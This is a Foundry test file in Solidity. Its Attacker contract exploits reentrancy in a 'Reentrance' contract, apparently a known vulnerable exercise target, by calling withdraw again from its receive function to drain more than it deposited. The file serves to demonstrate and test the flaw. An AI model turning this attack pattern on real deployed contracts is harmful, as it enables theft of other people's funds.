
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Reentrance} from "../src/Reentrance.sol";

contract TestReentrancyReentrance is Test {
    Reentrance public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrance();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 0);
        vm.assume(attackVal <= type(uint128).max);

        // --- 2. State Configuration (Pre-Condition) ---
        // The withdraw function requires the caller to have a balance >= _amount
        // This will be set up in the attacker's setupAttack function via donate

        // --- 3. Funding ---
        // A. Fund the Victim (so it has ETH to steal)
        vm.deal(address(_contractUnderTest), attackVal * 2);

        // B. Fund the Attacker
        vm.deal(address(_attacker), attackVal * 2);

        // C. Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    Reentrance public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = Reentrance(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;

        // Deposit funds into the victim contract to establish a balance
        victim.donate{value: val}(address(this));
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State - store attacker's ETH balance before attack
        initialSnapshot = address(this).balance;

        // 2. Store the value for the re-entrant call
        storedAttackVal = val;

        // 3. Call the vulnerable withdraw function
        victim.withdraw(val);

        // 4. Verify Success Conditions
        // The attack is successful if we received more ETH than we should have (2x due to reentrancy)
        // We deposited 'val' and should only withdraw 'val', but with reentrancy we get 2*val
        uint256 finalBalance = address(this).balance;
        uint256 gained = finalBalance - initialSnapshot;

        // If we gained more than the single withdrawal amount, reentrancy succeeded
        if (gained > val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            // Re-enter the withdraw function before balance is updated
            // The balance check will still pass because state hasn't been updated yet
            if (address(victim).balance >= storedAttackVal) {
                victim.withdraw(storedAttackVal);
            }
        }
    }

    fallback() external payable {}
}
